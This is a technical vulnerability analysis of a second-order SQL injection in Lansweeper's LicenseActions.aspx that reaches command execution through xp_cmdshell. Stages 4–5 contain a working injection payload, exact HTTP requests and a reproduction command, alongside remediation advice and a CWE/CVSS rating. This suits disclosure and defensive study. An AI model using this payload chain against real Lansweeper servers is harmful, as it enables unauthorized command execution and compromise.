# Lansweeper LicenseActions Second-Order SQL Injection Authenticated RCE — Full Technical Analysis

## Product Background

- **Vendor**: Lansweeper
- **Product**: Lansweeper 12.2.1.0 (web reports 12.2.1.6)
- **Category**: IT asset discovery / inventory management
- **Stack**: ASP.NET WebForms (.aspx console, IIS Express 82/83) + Kestrel API (`LansweeperService.exe`, 9524) + SQL Server (LocalDB)
- **Deployment**: Windows server; `lansweeperuser` DB account is SQL Server **sysadmin**; `xp_cmdshell` enabled by default

## Stage 0 — Prerequisites / Authentication Boundary

Two web services:
- `.aspx` WebForms console (490 .aspx) on IIS Express 82/83
- Kestrel API (`LansweeperService.exe`) on 9524

Auth model: custom session (NOT Forms Authentication). `web.config` has `<authentication mode="Windows"/>` + `<authorization><allow users="*"/></authorization>` — web.config does not enforce auth. Real auth is in the MasterPage `main` (`MainMaster.cs` / `login\main.cs`): `Page_init` + `Page_PreInit` check `Session["Webuser"]`; unauthenticated → 302 to `login.aspx`. The `custauth` cookie is unsigned (plaintext `username`+`userdomain`, HttpOnly, 15 days) and only pre-fills the login page — it does not carry auth state.

**Conclusion**: all business .aspx (including `LicenseActions.aspx`) are unreachable anonymously → Target A (unauthenticated RCE) is structurally unreachable. This is **Target B (authenticated RCE)**, requiring valid administrator credentials (set by the install wizard).

## Stage 1 — Sink Identification

`LS.CF.LicenseActions.cs`, `GetSqlServers` (L1466-1499) has a **raw string-concatenation SQL sink**:

```csharp
// LS.CF/LicenseActions.cs  L1466-1499
private static void GetSqlServers(ref DataTable dtresults)
{
    HttpContext current = HttpContext.Current;
    try {
        if (current.Request["id"] == "") { return; }
        int value = int.Parse(current.Request["id"]);
        DataTable dataTable = DB.ExecuteDataset(
            "SELECT * FROM tblSqlSubServers WHERE LicenseID=@LicenseID ORDER BY SubServerID ASC",
            DB.NewDBParameter("@LicenseID", value));
        string text = "SELECT * FROM tblSqlSubServers WHERE LicenseID=@LicenseID ";
        foreach (DataRow row in dataTable.Rows) {
            if (row["Name"].ToString().IndexOf('%') > -1) {
                text = text + "AND Name NOT LIKE '" + row["Name"].ToString() + "' ";  // L1482 — raw concat!
            }
        }
        dtresults = DB.ExecuteDataset(text + "ORDER BY SubServerID ASC",
            DB.NewDBParameter("@LicenseID", value));
    } catch (Exception ex) {
        current.Response.StatusCode = 500;
        current.Response.Write(ex.Message);
    }
}
```

L1482: `row["Name"]` from `tblSqlSubServers.Name` is concatenated with no escaping into `AND Name NOT LIKE '<Name>'`. If Name contains a single quote → SQL injection. `DB.ExecuteDataset` uses `SqlCommand.ExecuteReader`; SQL Server supports **stacked queries** → `EXEC xp_cmdshell`.

Trigger condition: `Name.IndexOf('%') > -1` — Name must contain `%` to enter the NOT LIKE branch.

## Stage 2 — Source Identification

`tblSqlSubServers.Name` write path = `AddSqlServer` (L1501-1527):

```csharp
// LS.CF/LicenseActions.cs  L1501-1527
private static void AddSqlServer()
{
    HttpContext current = HttpContext.Current;
    JsReturnObject jsReturnObject = new JsReturnObject();
    try {
        int value = int.Parse(current.Request["id"]);
        foreach (object item in (Array)new JavaScriptSerializer().Deserialize(
            current.Request["selected"], Type.GetType("Array"))) {
            string text = ((Array)item).GetValue(0).ToString();   // text1
            string text2 = ((Array)item).GetValue(1).ToString();  // text2
            string text3 = ((Array)item).GetValue(2).ToString();  // text3
            DB.ExecuteInsert(
                "INSERT INTO tblSqlSubServers(LicenseID,Name,AssetName) VALUES(@LicenseID,@name,@assetname)",
                out var id,
                DB.NewDBParameter("@LicenseID", value),
                DB.NewDBParameter("@name", text + " " + text2),   // Name = text1 + " " + text2
                DB.NewDBParameter("@assetname", text3));
            ...
        }
    } catch (Exception ex) { ... }
}
```

**Key**: INSERT is parameterized (`@name`), so the write itself is not injectable. But `text + " " + text2` is stored as Name **without** `CheckForSpecialSigns` (the project's input-validation function): single quotes, `%`, and `--` are stored raw. Source = `current.Request["selected"]` (JSON array), fully attacker-controlled.

## Stage 3 — Data Flow

```
HTTP POST selected=[["<text1>","<text2>","<text3>"]]
   └─ AddSqlServer (L1501) parameterized INSERT -> tblSqlSubServers.Name = text1+" "+text2  (no validation)
HTTP GET action=getsqlservers&id=1
   └─ GetSqlServers (L1466) reads tblSqlSubServers
        └─ Name contains '%' -> L1482 raw concat "AND Name NOT LIKE '<Name>'"
        └─ DB.ExecuteDataset(concat SQL) -> stacked query -> xp_cmdshell -> RCE
```

Second-order SQLi: the write is parameterized (safe), the read concatenates (dangerous). The attacker stores a malicious Name via `addsqlserver`, then triggers `getsqlservers` to complete the injection.

## Stage 4 — Injection / Exploitation Construction

**Dispatch logic** (`Load` L24-204), keyed on `action` + `IsPostBack`:
- `if (current.Request["id"] != "")` block: getinfo/getsoftware/.../getsqlinfo/getsqldocs/getsqlorders (NOT getsqlservers)
- `if (!page.IsPostBack)` block (GET): .../**getsqlservers** (L154-156)/...
- `else` block (POST/IsPostBack): getinfo→Saveinfo/addorder/.../**addsqllicense** (L193-194)/getsqlinfo→Savesqlinfo/**addsqlserver** (L199-200)

**CSRF**: `General.ValidateCsrf()` (L2835-2847) checks `__RequestVerificationToken` then calls `AntiForgery.Validate()`. **AddSqlServer / GetSqlServers / AddSQLLicense do NOT call ValidateCsrf** → no anti-forgery token needed.

**IsPostBack requirement**: the addsqlserver POST must include a `__VIEWSTATE` field (even empty `""`) for `IsPostBack=true` → dispatch to the else branch. Without it, IsPostBack=false → dialog HTML returned, no DB write.

**Malicious Name construction**:
- text1 = `x%'; EXEC sp_configure 'xp_cmdshell',1; RECONFIGURE; EXEC xp_cmdshell '<CMD>'--`
- text2 = `z`
- stored Name = `x%'; ...<CMD>'-- z` (contains `%` → triggers the NOT LIKE branch)

**Final concatenated SQL**:
```sql
SELECT * FROM tblSqlSubServers WHERE LicenseID=@LicenseID
AND Name NOT LIKE 'x%'; EXEC sp_configure 'xp_cmdshell',1; RECONFIGURE; EXEC xp_cmdshell '<CMD>'-- z ' ORDER BY SubServerID ASC
```
`--` comments out the trailing ` z ' ORDER BY...`. Stacked queries: enable xp_cmdshell + execute the command.

**DB account privilege (key amplifier)**: `lansweeperuser` = SQL Server **sysadmin** (IsSysadmin=1); `xp_cmdshell` value_in_use=1 (enabled). No need to bypass xp_cmdshell restrictions.

## Stage 5 — Dynamic Verification

Environment: Windows server, Lansweeper 12.2.1.0, IIS Express 83 (HTTPS), `admin` / `Lansweeper123!`.

Script flow (stdlib):
1. GET `login.aspx` → extract `__EVENTVALIDATION`
2. POST `login.aspx` (`__VIEWSTATE=`+EV+`NameTextBox=admin`+`PasswordTextBox=...`+`defaultuser=BUILT-IN ADMIN`) → 302, console home (auth OK)
3. POST `Software/licenses/LicenseActions.aspx?action=addsqlserver&id=1`, body `__VIEWSTATE=&selected=%5B%5B%22x%25%27%3B+EXEC+...%22%2C%22z%22%2C%22assetname%22%5D%5D`
   - Response: `{"Error":false,"AddedRows":[["x%'; EXEC sp_configure 'xp_cmdshell',1; RECONFIGURE; EXEC xp_cmdshell 'echo PWNED > C:/Windows/Temp/ls_vuln001_rce.txt'-- z","5","assetname"]]}`
4. GET `Software/licenses/LicenseActions.aspx?action=getsqlservers&id=1` → 2835 bytes (editsservers table HTML; SQLi executes silently)

Target-side verification:
```
C:\Windows\Temp\ls_vuln001_rce.txt  8 bytes  content="PWNED"
owner = NT SERVICE\LansweeperLocalDbService
```
→ xp_cmdshell executed as the SQL service account; **RCE confirmed**.

## Stage 6 — Reachability

- **Auth**: valid Lansweeper credentials required (admin). MasterPage auth gate makes anonymous access unreachable
- **LicenseID**: default LicenseID=1 exists on install; `id=1` works
- **DB privilege**: `lansweeperuser` default sysadmin + xp_cmdshell enabled → no extra privilege escalation
- **CSRF**: AddSqlServer/GetSqlServers do not validate anti-forgery tokens → no bypass needed
- **IsPostBack**: a POST with an empty `__VIEWSTATE` field suffices
- **Leftover rows**: if `tblSqlSubServers` already contains a `%` row, its `--` may comment out the new payload; delete old rows via `delsqlserver` or ensure the own row executes first (a single row suffices in practice)

## Stage 7 — Defense in Depth / Remediation

1. **GetSqlServers L1482**: use parameterized `AND Name NOT LIKE @name` (`DB.NewDBParameter("@name", row["Name"])`), never raw concat
2. **AddSqlServer**: run parsed text/text2 through `CheckForSpecialSigns` / whitelist; reject `'`/`%`/`--`/`;`
3. **DB privilege drop**: `lansweeperuser` must not be sysadmin; use least-privilege roles; disable `xp_cmdshell` (`sp_configure 'xp_cmdshell',0`)
4. **CSRF**: AddSqlServer/GetSqlServers/AddSQLLicense should call `ValidateCsrf`
5. **Defense in depth**: add web.config `<authorization>` explicitly denying anonymous

## Reproduction

```bash
# on a host that can reach the target Lansweeper web console
python3 exploit.py https://<host>:83 <user> <pass> "echo PWNED > C:/Windows/Temp/ls_vuln001_rce.txt"
# verify on the target: C:\Windows\Temp\ls_vuln001_rce.txt exists with content PWNED
```

## CWE / CVSS

- CWE-89 (SQL Injection) — second-order raw concatenation in `GetSqlServers`
- CWE-78 (OS Command Injection) — `xp_cmdshell` command execution
- **CVSS 3.1**: ≈ 8.8 (AV:N/AC:L/PR:H/UI:N/S:C/C:H/I:H/A:H) — PR:H because administrator credentials are required
